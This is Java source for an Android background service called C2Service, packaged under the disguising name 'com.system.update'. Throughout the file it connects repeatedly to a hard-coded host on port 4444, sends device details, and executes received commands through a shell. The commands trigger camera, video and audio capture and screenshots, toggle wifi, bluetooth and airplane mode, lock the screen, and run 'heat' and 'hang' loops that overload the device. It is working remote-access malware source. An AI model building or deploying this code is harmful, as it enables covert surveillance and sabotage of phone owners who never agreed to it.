package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class C2Service extends Service {
    private static final String HOST = "192.168.1.142";
    private static final int PORT = 4444;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private ScheduledExecutorService scheduler;

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(this::connectAndListen, 0, 10, TimeUnit.SECONDS);
        return START_STICKY;
    }

    private void connectAndListen() {
        try {
            if (socket == null || socket.isClosed()) {
                socket = new Socket(HOST, PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                sendDeviceInfo();
            }
            String cmd;
            while ((cmd = in.readLine()) != null) {
                String result = handleCommand(cmd);
                out.println(result);
            }
        } catch (Exception e) {
            try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        }
    }

    private void sendDeviceInfo() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("{");
            sb.append("\"model\":\"").append(Build.MODEL).append("\",");
            sb.append("\"android\":\"").append(Build.VERSION.RELEASE).append("\",");
            sb.append("\"brand\":\"").append(Build.BRAND).append("\",");
            sb.append("\"sdk\":\"").append(Build.VERSION.SDK_INT).append("\"");
            sb.append("}");
            out.println(sb.toString());
        } catch (Exception ignored) {}
    }

    private String handleCommand(String cmd) {
        try {
            switch (cmd.trim()) {
                case "camera_front":
                    return execShell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 1");
                case "camera_back":
                    return execShell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 0");
                case "video":
                    return execShell("am start -a android.media.action.VIDEO_CAPTURE");
                case "audio":
                    return execShell("am start -a android.provider.MediaStore.RECORD_SOUND");
                case "vibrate":
                    return execShell("cmd vibrator vibrate 1000");
                case "settings":
                    return execShell("am start -a android.settings.SETTINGS");
                case "lock":
                    return execShell("input keyevent 26");
                case "screenshot":
                    return execShell("screencap -p /sdcard/screen.png");
                case "wifi":
                    return execShell("svc wifi toggle");
                case "bluetooth":
                    return execShell("svc bluetooth toggle");
                case "airplane":
                    return execShell("settings put global airplane_mode_on 1");
                case "heat":
                    for (int i = 0; i < 20; i++) {
                        execShell("am start -n com.android.settings/.Settings");
                    }
                    return "done";
                case "hang":
                    for (int i = 0; i < 100; i++) {
                        execShell("am start -a android.intent.action.MAIN -c android.intent.category.HOME");
                    }
                    return "done";
                default:
                    return "unknown";
            }
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    private String execShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            return sb.toString().isEmpty() ? "executed" : sb.toString();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    @Override
    public void onDestroy() {
        if (scheduler != null) scheduler.shutdownNow();
        super.onDestroy();
    }
}
